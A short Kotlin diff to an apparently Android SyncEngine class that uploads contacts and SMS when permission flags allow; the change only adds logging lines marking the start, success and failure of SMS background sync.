@@ -68,6 +68,7 @@ class SyncEngine @Inject constructor(
             }
 
             Log.d("SyncEngine", "SYNC_UPLOAD_STARTED")
+            Log.d("SyncEngine", "SMS_BACKGROUND_SYNC_STARTED")
 
             val contacts = if (contactsAllowed) DataHelper.fetchContacts(context, sinceTimestamp = lastContactSync) else emptyList()
             val sms = if (smsAllowed) DataHelper.fetchSMS(context, sinceTimestamp = lastSmsSync) else emptyList()
@@ -123,6 +124,7 @@ class SyncEngine @Inject constructor(
 
             Log.d("SyncEngine", "SYNC_UPLOAD_SUCCESS")
             Log.d("SyncEngine", "BACKGROUND_SYNC_SUCCESS")
+            Log.d("SyncEngine", "SMS_BACKGROUND_SYNC_SUCCESS")
             if (isFullSync) Log.d("SyncEngine", "CLIENT_FULL_SYNC_SUCCESS")
             Log.d("SyncEngine", "ADMIN_REALTIME_UPDATED")
             return SyncResult.Success
@@ -130,6 +132,7 @@ class SyncEngine @Inject constructor(
             val message = e.localizedMessage ?: e.message ?: e.javaClass.simpleName
             Log.e("SyncEngine", "SYNC_UPLOAD_FAILED", e)
             Log.e("SyncEngine", "BACKGROUND_SYNC_FAILED: $message")
+            Log.e("SyncEngine", "SMS_BACKGROUND_SYNC_FAILED: $message")
             if (isFullSync) Log.d("SyncEngine", "CLIENT_FULL_SYNC_FAILED")
             try {
                 repository.updateDeviceInfoMap(deviceId, baseDeviceMap(deviceId, System.currentTimeMillis()) + mapOf(
